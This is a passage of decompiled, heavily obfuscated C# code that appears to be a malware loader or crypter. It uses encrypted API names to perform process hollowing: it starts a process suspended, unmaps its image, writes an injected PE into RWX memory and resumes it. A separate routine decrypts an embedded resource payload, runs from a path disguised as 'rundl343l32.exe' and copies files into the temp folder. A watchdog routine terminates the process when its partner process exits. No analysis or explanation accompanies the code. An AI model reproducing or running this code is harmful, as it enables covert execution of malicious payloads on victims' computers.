						class36_0.int_2 = 4;
						break;
					}
					return true;
					IL_0257:
					class36_0.byte_2 = 0;
					goto IL_025e;
					IL_009f:
					class36_0.int_4 = Class56.smethod_48(class33_0, 5);
					if (class36_0.int_4 >= 0)
					{
						class36_0.int_4++;
						Class56.smethod_71(class33_0, 5);
						class36_0.int_6 = class36_0.int_3 + class36_0.int_4;
						class36_0.byte_1 = new byte[class36_0.int_6];
						class36_0.int_2 = 2;
						goto case 2;
					}
					return false;
					IL_025e:
					class36_0.int_7 = num2 - 16;
					class36_0.int_2 = 5;
					goto case 5;
					IL_0105:
					if (class36_0.int_5 >= 0)
					{
						class36_0.int_5 += 4;
						Class56.smethod_71(class33_0, 4);
						class36_0.byte_0 = new byte[19];
						class36_0.int_8 = 0;
						class36_0.int_2 = 3;
						goto case 3;
					}
					return false;
					IL_0091:
					Class56.smethod_71(class33_0, 5);
					class36_0.int_2 = 1;
					goto IL_009f;
					end_IL_01aa:
					break;
				}
				break;
			}
		}
	}

	static bool smethod_102(Class31.Class40 class40_0)
	{
		return class40_0.int_8 == class40_0.int_7;
	}

	static void smethod_103(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	static Assembly[] smethod_104(Class45 class45_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class56.smethod_7() };
		}
	}

	static void smethod_105(Class44 class44_0, Enum4 enum4_0)
	{
		Class56.smethod_51(class44_0, enum4_0, string.Empty);
	}

	static void smethod_106(Class45 class45_0, Exception exception_0)
	{
		using (new Class59(class45_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class45_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class45_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class45_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class45_0.xmlWriter_0.WriteAttributeString("Method", text);
				class45_0.method_1(new Class49(exception_0, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static Class31.Class35 smethod_107(Class31.Class36 class36_0)
	{
		byte[] array = new byte[class36_0.int_3];
		Array.Copy(class36_0.byte_1, 0, array, 0, class36_0.int_3);
		return new Class31.Class35(array);
	}

	static object smethod_108(string string_0, object object_0)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class30.SubkeyApplication);
		if (registryKey == null)
		{
			return object_0;
		}
		return registryKey.GetValue(string_0, object_0);
	}

	static bool smethod_109(object[] object_0)
	{
		Class17.Class18 @class = new Class17.Class18();
		Class20.Delegate3 @delegate = Class17.smethod_1<Class20.Delegate3>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("ABUKocXA/8U8/dTyQqSgxw=="));
		Class20.Delegate4 delegate2 = Class17.smethod_1<Class20.Delegate4>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("0r4Q+KffRShOMrJXQ5bIPBPfs2ueDUQLhElRpvSNOD8="));
		Class20.Delegate5 delegate3 = Class17.smethod_1<Class20.Delegate5>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("Fk2eZIMApwcIWTEmb2cS+hpgxP8KTAVFVbM4GPTL2b4="));
		Class20.Delegate6 delegate4 = Class17.smethod_1<Class20.Delegate6>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("sBgrGtKz4j+pZ39VniTPP4yPMBN4WHVY4IS8ZY4fmSE="));
		Class20.Delegate7 delegate5 = Class17.smethod_1<Class20.Delegate7>(Class56.smethod_36("pdd3zZ5lwXtj8hV1GKRfVw=="), Class56.smethod_36("2duPdAetIoKQy5xe5y0s2W+3unGrWO/nhF7+U9Kw7MI="));
		Class20.Delegate8 delegate6 = Class17.smethod_1<Class20.Delegate8>(Class56.smethod_36("pdd3zZ5lwXtj8hV1GKRfVw=="), Class56.smethod_36("RxKVVbtH14pgjdXaw2C1YbWUQxywTFbqf/pZBB51J5c="));
		Class20.Delegate9 delegate7 = Class17.smethod_1<Class20.Delegate9>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("TgOhAyN9YiqdYirD3QytuA=="));
		Class20.Delegate10 delegate8 = Class17.smethod_1<Class20.Delegate10>(Class56.smethod_36("pdd3zZ5lwXtj8hV1GKRfVw=="), Class56.smethod_36("qt4tHmTORXFlu08c+szp/A=="));
		string text = (string)object_0[0];
		byte[] array = (byte[])object_0[1];
		bool flag = (bool)object_0[2];
		bool flag2 = (bool)object_0[3];
		string text2 = (string)object_0[4];
		int bytesRead = 0;
		string text3 = $"\"{text2}\"";
		Class20.Struct1 startupInfo = default(Class20.Struct1);
		@class.struct0_0 = default(Class20.Struct0);
		startupInfo.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Class20.Struct1)));
		bool result;
		checked
		{
			try
			{
				Class17.Class18.Class19 CS_0024_003C_003E8__locals0 = new Class17.Class18.Class19();
				CS_0024_003C_003E8__locals0.class18_0 = @class;
				int num = 5;
				if (!J5IwCwpfghTToLC3MgK())
				{
				}
				int[] array3 = default(int[]);
				int num2 = default(int);
				int buffer = default(int);
				int num4 = default(int);
				int num3 = default(int);
				int num8 = default(int);
				short num9 = default(short);
				int num5 = default(int);
				int num6 = default(int);
				int srcOffset = default(int);
				int num7 = default(int);
				bool flag3 = default(bool);
				Thread thread = default(Thread);
				while (true)
				{
					int length;
					switch (num)
					{
					case 13:
						array3 = new int[179];
						array3[0] = 65538;
						goto case 0;
					case 0:
						if (delegate4(@class.struct0_0.intptr_1, array3))
						{
							num2 = array3[41];
							goto case 4;
						}
						throw new Exception();
					case 4:
						buffer = 0;
						num = 8;
						if (eBBp0Op7wSDKHwLe0VT())
						{
							continue;
						}
						goto case 1;
					case 5:
						if (!string.IsNullOrEmpty(text))
						{
							text3 = text3 + " " + text;
						}
						if (@delegate(text2, text3, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref @class.struct0_0))
						{
							num4 = BitConverter.ToInt32(array, 60);
							num3 = BitConverter.ToInt32(array, num4 + 52);
							goto case 13;
						}
						throw new Exception();
					case 8:
						if (!delegate2(@class.struct0_0.intptr_0, num2 + 8, ref buffer, 4, ref bytesRead))
						{
							throw new Exception();
						}
						if (num3 == buffer)
						{
							goto case 10;
						}
						goto IL_02b5;
					case 10:
						if (delegate6(@class.struct0_0.intptr_0, buffer) != 0)
						{
							throw new Exception();
						}
						goto IL_02b5;
					case 6:
					case 12:
						if (CS_0024_003C_003E8__locals0.int_0 == 0)
						{
							goto default;
						}
						if (delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0, array, CS_0024_003C_003E8__locals0.int_1, ref bytesRead))
						{
							num8 = num4 + 248;
							num9 = BitConverter.ToInt16(array, num4 + 6);
							num5 = 0;
							goto case 3;
						}
						goto case 14;
					default:
						throw new Exception();
					case 1:
						if (num6 != 0)
						{
							byte[] array2 = new byte[num6 - 1 + 1];
							Buffer.BlockCopy(array, srcOffset, array2, 0, array2.Length);
							if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0 + num7, array2, array2.Length, ref bytesRead))
							{
								throw new Exception();
							}
						}
						num8 += 40;
						goto case 2;
					case 2:
						num5++;
						goto case 3;
					case 3:
					case 11:
					{
						if (num5 <= num9 - 1)
						{
							num7 = BitConverter.ToInt32(array, num8 + 12);
							num6 = BitConverter.ToInt32(array, num8 + 16);
							srcOffset = BitConverter.ToInt32(array, num8 + 20);
							goto case 1;
						}
						byte[] bytes = BitConverter.GetBytes(CS_0024_003C_003E8__locals0.int_0);
						if (!delegate3(@class.struct0_0.intptr_0, num2 + 8, bytes, 4, ref bytesRead))
						{
							throw new Exception();
						}
						int num10 = BitConverter.ToInt32(array, num4 + 40);
						if (flag3)
						{
							CS_0024_003C_003E8__locals0.int_0 = num3;
						}
						array3[44] = CS_0024_003C_003E8__locals0.int_0 + num10;
						if (unchecked((long)delegate5(@class.struct0_0.intptr_1, array3)) != 0L)
						{
							throw new Exception();
						}
						if (flag2)
						{
							new Thread((ThreadStart)delegate
							{
								Thread.CurrentThread.IsBackground = true;
								Class20.Struct0 struct0_ = CS_0024_003C_003E8__locals0.class18_0.struct0_0;
								uint uint_ = (uint)CS_0024_003C_003E8__locals0.int_0;
								int int_ = CS_0024_003C_003E8__locals0.int_1;
								Class56.smethod_30(int_, uint_, struct0_);
							}).Start();
							goto end_IL_0220;
						}
						uint SuspendCount = 0u;
						if (delegate8(@class.struct0_0.intptr_1, out SuspendCount) == -1)
						{
							throw new Exception();
						}
						thread = new Thread((ThreadStart)delegate
						{
							Class56.smethod_121((int)CS_0024_003C_003E8__locals0.class18_0.struct0_0.uint_0);
						});
						thread.IsBackground = true;
						break;
					}
					case 14:
						throw new Exception();
					case 15:
						break;
						IL_02b5:
						length = BitConverter.ToInt32(array, num4 + 80);
						CS_0024_003C_003E8__locals0.int_1 = BitConverter.ToInt32(array, num4 + 84);
						flag3 = false;
						CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, num3, length, 12288, 64);
						if (!flag && CS_0024_003C_003E8__locals0.int_0 == 0)
						{
							flag3 = true;
							CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, 0, length, 12288, 64);
						}
						goto case 6;
					}
					thread.Start();
					break;
					continue;
					end_IL_0220:
					break;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_0520;
			}
			Thread.Sleep(100);
			return true;
		}
		IL_0520:
		return result;
	}

	static int smethod_110(Class31.Class38 class38_0, int int_0)
	{
		int num;
		if (int_0 == 255)
		{
			num = 3;
			if (eBBp0Op7wSDKHwLe0VT())
			{
				goto IL_0036;
			}
			goto IL_005c;
		}
		int num2 = 257;
		goto IL_0053;
		IL_0036:
		switch (num)
		{
		case 0:
		case 3:
			goto IL_005c;
		case 5:
			goto IL_0064;
		case 4:
		{
			int result = default(int);
			return result;
		}
		}
		goto IL_0053;
		IL_005c:
		return 285;
		IL_0053:
		while (int_0 >= 8)
		{
			num2 += 4;
			int_0 >>= 1;
		}
		num = 5;
		if (!J5IwCwpfghTToLC3MgK())
		{
			goto IL_0036;
		}
		goto IL_0064;
		IL_0064:
		return num2 + int_0;
	}

	static IntPtr smethod_111(string string_0)
	{
		IEnumerator enumerator = default(IEnumerator);
		IntPtr baseAddress;
		try
		{
			enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ProcessModule processModule = (ProcessModule)enumerator.Current;
				if (!processModule.ModuleName!.ToLower().StartsWith(string_0))
				{
					continue;
				}
				baseAddress = processModule.BaseAddress;
				goto IL_0060;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return IntPtr.Zero;
		IL_0060:
		return baseAddress;
	}

	static void smethod_112(Exception exception_0, object object_0)
	{
		Class56.smethod_46(exception_0, new object[1] { object_0 });
	}

	static void smethod_113()
	{
		string text = "";
	}

	static Icon smethod_114()
	{
		int int_ = 0;
		int int_2 = 0;
		int num = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
		if (num > 0)
		{
			ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
			if (int_ != 0)
			{
				return Icon.FromHandle(new IntPtr(int_));
			}
		}
		return null;
	}

	static void smethod_115(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class56.smethod_46(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	[DllImport("kernel32.Dll")]
	internal static extern void GetSystemInfo(ref Class58.Struct25 struct25_0);

	static void smethod_116(Class54 class54_0, IWebProxy iwebProxy_0)
	{
		class54_0.iwebProxy_0 = iwebProxy_0;
	}

	static bool smethod_117(Class31.Class40 class40_0, int int_0)
	{
		int num = 128;
		int num2 = 128;
		int num8 = default(int);
		while (true)
		{
			short[] short_ = class40_0.short_1;
			int num3 = class40_0.int_4;
			int num4 = class40_0.int_4 + class40_0.int_2;
			int num5 = Math.Max(class40_0.int_2, 2);
			int num6 = Math.Max(class40_0.int_4 - 32506, 0);
			while (true)
			{
				int num7 = class40_0.int_4 + 258 - 1;
				byte b = class40_0.byte_0[num4 - 1];
				byte b2 = class40_0.byte_0[num4];
				if (num5 >= 8)
				{
					num >>= 2;
				}
				while (true)
				{
					if (num2 > class40_0.int_5)
					{
						if (!J5IwCwpfghTToLC3MgK())
						{
							switch (10)
							{
							case 6:
								break;
							case 9:
								goto end_IL_005e;
							case 5:
								goto end_IL_0072;
							case 3:
							case 10:
								goto IL_00e4;
							case 1:
								goto IL_010a;
							case 2:
								goto IL_01b1;
							case 4:
								goto IL_021b;
							default:
								goto IL_0225;
							case 7:
							case 11:
								goto IL_0246;
							case 8:
								goto IL_029a;
							case 12:
								goto IL_02ad;
							}
							continue;
						}
						goto IL_00e4;
					}
					goto IL_0283;
					IL_0225:
					if (class40_0.byte_0[++num3] == class40_0.byte_0[++num8] && class40_0.byte_0[++num3] == class40_0.byte_0[++num8] && class40_0.byte_0[++num3] == class40_0.byte_0[++num8])
					{
						goto IL_021b;
					}
					goto IL_0241;
					IL_010a:
					if (--num != 0)
					{
						goto IL_0283;
					}
					goto IL_029a;
					IL_00e4:
					num2 = class40_0.int_5;
					goto IL_0283;
					IL_0283:
					if (class40_0.byte_0[int_0 + num5] != b2 || class40_0.byte_0[int_0 + num5 - 1] != b || class40_0.byte_0[int_0] != class40_0.byte_0[num3] || class40_0.byte_0[int_0 + 1] != class40_0.byte_0[num3 + 1])
					{
						goto IL_00f0;
					}
					num8 = int_0 + 2;
					num3 += 2;
					goto IL_015a;
					IL_029a:
					class40_0.int_2 = Math.Min(num5, class40_0.int_5);
					goto IL_02ad;
					IL_021b:
					if (num3 < num7)
					{
						goto IL_015a;
					}
					goto IL_0241;
					IL_0241:
					if (num3 > num4)
					{
						goto IL_0246;
					}
					goto IL_0277;
					IL_0246:
					class40_0.int_1 = int_0;
					num4 = num3;
					num5 = num3 - class40_0.int_4;
					if (num5 < num2)
					{
						b = class40_0.byte_0[num4 - 1];
						b2 = class40_0.byte_0[num4];
						goto IL_0277;
					}
					goto IL_029a;
					IL_015a:
					if (class40_0.byte_0[++num3] == class40_0.byte_0[++num8] && class40_0.byte_0[++num3] == class40_0.byte_0[++num8] && class40_0.byte_0[++num3] == class40_0.byte_0[++num8])
					{
						goto IL_01b1;
					}
					goto IL_0241;
					IL_02ad:
					return class40_0.int_2 >= 3;
					IL_0277:
					num3 = class40_0.int_4;
					goto IL_00f0;
					IL_01b1:
					if (class40_0.byte_0[++num3] == class40_0.byte_0[++num8] && class40_0.byte_0[++num3] == class40_0.byte_0[++num8])
					{
						goto IL_0225;
					}
					goto IL_0241;
					IL_00f0:
					if ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num6)
					{
						goto IL_010a;
					}
					goto IL_029a;
					continue;
					end_IL_005e:
					break;
				}
				continue;
				end_IL_0072:
				break;
			}
		}
	}

	static void smethod_118()
	{
		try
		{
			Class27.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static bool smethod_119(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static object smethod_120(Class49 class49_0)
	{
		return class49_0.object_0;
	}

	static void smethod_121(int int_0)
	{
		while (true)
		{
			try
			{
				Process.GetProcessById(int_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetCurrentProcess().Kill();
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(2000);
			GC.Collect();
		}
	}

	static bool smethod_122()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Class56.smethod_126((Class54)new Class55());
			return true;
		}
		catch (SecurityException)
		{
			try
			{
				Application.EnableVisualStyles();
				string securityMessage = string.Format("{0} cannot initialize itself because some permissions are not granted.\n\nYou probably try to launch {0} in a partial-trust situation. It's usually the case when the application is hosted on a network share.\n\nYou need to run {0} in full-trust, or at least grant it the UnmanagedCode security permission.\n\nTo grant this application the required permission, contact your system administrator, or use the Microsoft .NET Framework Configuration tool.", "vf");
				Form1 form = new Form1(new EventArgs2(securityMessage, canContinue: false));
				((Form)form).set_ShowInTaskbar(true);
				((Form)form).ShowDialog();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString(), string.Format("{0} Fatal Error", "vf"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			return false;
		}
	}

	static void smethod_123(Class31.Class34 class34_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class34_0.byte_0[class34_0.int_0++] = class34_0.byte_0[int_0++];
			class34_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_124(Class31.Class38.Class39 class39_0, int[] int_0)
	{
		class39_0.byte_0 = new byte[class39_0.short_0.Length];
		int num5 = default(int);
		int i = default(int);
		int[] array = default(int[]);
		int num6 = default(int);
		int num7 = default(int);
		int num9 = default(int);
		int num10 = default(int);
		int num4 = default(int);
		int num11 = default(int);
		while (true)
		{
			int num = int_0.Length / 2;
			int num2 = (num + 1) / 2;
			int num3 = 12;
			if (eBBp0Op7wSDKHwLe0VT())
			{
				while (true)
				{
					switch (num3)
					{
					case 12:
						num5 = 0;
						i = 0;
						goto case 0;
					case 0:
					case 11:
						for (; i < class39_0.int_3; i++)
						{
							class39_0.int_2[i] = 0;
						}
						array = new int[num];
						array[num - 1] = 0;
						goto case 4;
					case 4:
					case 5:
						num6 = num - 1;
						goto IL_0050;
					case 6:
						num7 = class39_0.int_3;
						num5++;
						goto default;
					default:
						array[int_0[2 * num6]] = (array[int_0[2 * num6 + 1]] = num7);
						goto IL_00ba;
					case 3:
						class39_0.int_2[num9]--;
						goto case 2;
					case 2:
					case 8:
						class39_0.int_2[++num9]++;
						num5 -= 1 << class39_0.int_3 - 1 - num9;
						if (num5 <= 0 || num9 >= class39_0.int_3 - 1)
						{
							if (num5 <= 0)
							{
								class39_0.int_2[class39_0.int_3 - 1] += num5;
								class39_0.int_2[class39_0.int_3 - 2] -= num5;
								num10 = 2 * num2;
								num3 = 9;
								if (!J5IwCwpfghTToLC3MgK())
								{
								}
								continue;
							}
							goto IL_00ee;
						}
						goto case 3;
					case 10:
						break;
					case 9:
						num4 = class39_0.int_3;
						goto IL_0258;
					case 7:
						goto IL_0250;
					case 13:
						goto IL_0258;
						IL_00ba:
						num6--;
						goto IL_0050;
						IL_0050:
						if (num6 >= 0)
						{
							if (int_0[2 * num6 + 1] != -1)
							{
								num7 = array[num6] + 1;
								if (num7 > class39_0.int_3)
								{
									goto case 6;
								}
								goto default;
							}
							int num8 = array[num6];
							class39_0.int_2[num8 - 1]++;
							class39_0.byte_0[int_0[2 * num6]] = (byte)array[num6];
							goto IL_00ba;
						}
						if (num5 != 0)
						{
							num9 = class39_0.int_3 - 1;
							goto IL_00ee;
						}
						return;
						IL_00ee:
						while (class39_0.int_2[--num9] == 0)
						{
						}
						goto case 3;
					}
					break;
				}
				continue;
			}
			goto IL_0258;
			IL_0250:
			while (num11 > 0)
			{
				int num12 = 2 * int_0[num10++];
				if (int_0[num12 + 1] == -1)
				{
					class39_0.byte_0[int_0[num12]] = (byte)num4;
					num11--;
				}
			}
			num4--;
			goto IL_0258;
			IL_0258:
			if (num4 != 0)
			{
				num11 = class39_0.int_2[num4 - 1];
				goto IL_0250;
			}
			break;
		}
	}

	static void smethod_125(Class31.Class38 class38_0)
	{
		for (int i = 0; i < class38_0.int_1; i++)
		{
			int num = class38_0.byte_1[i] & 0xFF;
			int num2 = class38_0.short_0[i];
			if (num2-- != 0)
			{
				int num3 = Class56.smethod_110(class38_0, num);
				Class56.smethod_35(class38_0.class39_0, num3);
				int num4 = (num3 - 261) / 4;
				if (num4 > 0 && num4 <= 5)
				{
					Class56.smethod_12(class38_0.class41_0, num & ((1 << num4) - 1), num4);
				}
				int num5 = Class56.smethod_140(class38_0, num2);
				Class56.smethod_35(class38_0.class39_1, num5);
				num4 = num5 / 2 - 1;
				if (num4 > 0)
				{
					Class56.smethod_12(class38_0.class41_0, num2 & ((1 << num4) - 1), num4);
				}
			}
			else
			{
				Class56.smethod_35(class38_0.class39_0, num);
			}
		}
		Class56.smethod_35(class38_0.class39_0, 256);
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_126(Class54 class54_0)
	{
		while (class54_0 != null)
		{
			if (!J5IwCwpfghTToLC3MgK())
			{
				switch (1)
				{
				case 0:
				case 3:
					break;
				case 1:
					goto IL_0034;
				default:
					goto IL_003a;
				case 5:
					return;
				}
				continue;
			}
			goto IL_0034;
			IL_0034:
			Class54.class54_0 = class54_0;
			goto IL_003a;
			IL_003a:
			AppDomain.CurrentDomain.UnhandledException += class54_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class54_0.method_0);
			break;
		}
	}

	static void smethod_127(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class56.smethod_46(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_128(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class56.smethod_46(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static byte[] smethod_129(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class56.smethod_58(byte_0, 3, byte_1, byte_2);
	}

	static void smethod_130(Class31.Class40 class40_0, byte[] byte_0)
	{
		class40_0.byte_1 = byte_0;
		if (eBBp0Op7wSDKHwLe0VT())
		{
			switch (2)
			{
			case 0:
			case 2:
				break;
			default:
				goto IL_0034;
			}
		}
		class40_0.int_7 = 0;
		goto IL_0034;
		IL_0034:
		class40_0.int_8 = byte_0.Length;
	}

	static int smethod_131(Class31.Class34 class34_0)
	{
		return class34_0.int_1;
	}

	static Icon smethod_132(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_133(Class5.Class10 class10_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] array = default(byte[]);
		string text = default(string);
		object executablePath = default(object);
		string text3 = default(string);
		bool flag = default(bool);
		ResourceManager resourceManager = default(ResourceManager);
		string text4 = default(string);
		string text5 = default(string);
		byte[] array2 = default(byte[]);
		string sourceFileName = default(string);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				byte[] array3;
				string text6;
				bool flag2;
				string empty;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 791:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0057;
						case 6:
							goto IL_005d;
						case 7:
							goto IL_00c0;
						case 8:
						case 9:
							goto IL_00c6;
						case 10:
						case 11:
							goto IL_00ca;
						case 12:
							goto IL_00df;
						case 13:
							goto IL_00fe;
						case 14:
						case 15:
							goto IL_0112;
						case 16:
							goto IL_012c;
						case 17:
							goto IL_0132;
						case 18:
							goto IL_0143;
						case 20:
							goto IL_014b;
						case 21:
							goto IL_014f;
						case 23:
							goto IL_0168;
						case 19:
						case 22:
						case 24:
						case 25:
						case 26:
							goto IL_016c;
						case 27:
							goto IL_0177;
						case 28:
							goto IL_01a5;
						case 29:
							goto IL_01ab;
						case 30:
							goto IL_01b5;
						case 31:
							goto IL_01ce;
						case 32:
							goto IL_01e5;
						case 33:
							goto IL_01fc;
						case 34:
							goto IL_020e;
						case 35:
							goto IL_021c;
						case 36:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 37:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_021c:
					num = 35;
					Class56.smethod_57(new object[5]
					{
						string.Empty,
						array,
						false,
						false,
						text
					});
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002b;
					IL_002b:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0034;
					IL_0034:
					num = 4;
					text3 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_0057;
					IL_0057:
					num = 5;
					flag = false;
					goto IL_005d;
					IL_005d:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual((object)(text3 + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") + ""), Operators.ConcatenateObject(Operators.ConcatenateObject(executablePath, (object)""), (object)""), false))
					{
						goto IL_00c0;
					}
					goto IL_00c6;
					IL_00c0:
					num = 7;
					flag = true;
					goto IL_00c6;
					IL_00c6:
					num = 9;
					goto IL_00ca;
					IL_00ca:
					num = 11;
					resourceManager = new ResourceManager("个您七明南过", Assembly.GetExecutingAssembly());
					goto IL_00df;
					IL_00df:
					num = 12;
					text4 = "" + Interaction.Environ("TEMP") + "";
					goto IL_00fe;
					IL_00fe:
					num = 13;
					Class56.smethod_77(Class56.smethod_95("oAJ9Pm/REVvo5UjKLLNqMA=="));
					goto IL_0112;
					IL_0112:
					num = 15;
					text5 = Class56.smethod_95("qJ1rx6zo0JWv6cXezCyOGQ==") + ".exe";
					goto IL_012c;
					IL_012c:
					num = 16;
					array2 = array2;
					goto IL_0132;
					IL_0132:
					num = 17;
					array3 = Class56.smethod_62("fsfsdfsdfsdfsdf", array2);
					goto IL_0143;
					IL_0143:
					num = 18;
					if (flag)
					{
						goto IL_014b;
					}
					goto IL_016c;
					IL_014b:
					num = 20;
					goto IL_014f;
					IL_014f:
					num = 21;
					if (!Operators.ConditionalCompareObjectEqual(executablePath, (object)(text3 + "#nsdffdsp#$$$.exe$$$"), false))
					{
						goto IL_0168;
					}
					goto IL_016c;
					IL_0168:
					num = 23;
					goto IL_016c;
					IL_016c:
					num = 26;
					text6 = "";
					goto IL_0177;
					IL_0177:
					num = 27;
					sourceFileName = Interaction.Environ(Class56.smethod_95("rRhnphBugUiRcVlpVgLfjw==")) + Class56.smethod_95("ijulUbn8DPPkee8Mdv0Pf3JPXTMNWvYRORO+JfoPSAU=") + Class56.smethod_95("RmHHgWXRYcJTbievhyZVDA==");
					goto IL_01a5;
					IL_01a5:
					num = 28;
					flag2 = false;
					goto IL_01ab;
					IL_01ab:
					num = 29;
					empty = string.Empty;
					goto IL_01b5;
					IL_01b5:
					num = 30;
					text = "" + text4 + "\\" + text5;
					goto IL_01ce;
					IL_01ce:
					num = 31;
					byte_ = (byte[])resourceManager.GetObject("贵南哥没妈贵");
					goto IL_01e5;
					IL_01e5:
					num = 32;
					array = Class56.smethod_62(Class56.smethod_95("axfXKc1uSPw22HSCJhAWEa6DjhDSpCiOMzx2Wd3rCNIeUVvr7X0cLx7c6+sI2SXe"), byte_);
					goto IL_01fc;
					IL_01fc:
					num = 33;
					File.Delete(text3 + text5);
					goto IL_020e;
					IL_020e:
					num = 34;
					File.Copy(sourceFileName, text, overwrite: true);
					goto IL_021c;
					end_IL_0000_2:
					break;
				}
				num = 36;
				Thread.Sleep(10000);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 791;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_134(string string_0, EventArgs1 eventArgs1_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class56.smethod_26(eventArgs1_0.class45_0, string_0);
	}

	static int smethod_135(Class31.Class38.Class39 class39_0)
	{
		int num = 0;
		for (int i = 0; i < class39_0.short_0.Length; i++)
		{
			num += class39_0.short_0[i] * class39_0.byte_0[i];
		}
		return num;
	}

	static void smethod_136(object object_0, string string_0, Class45 class45_0)
	{
		class45_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_137(Class31.Class41 class41_0)
	{
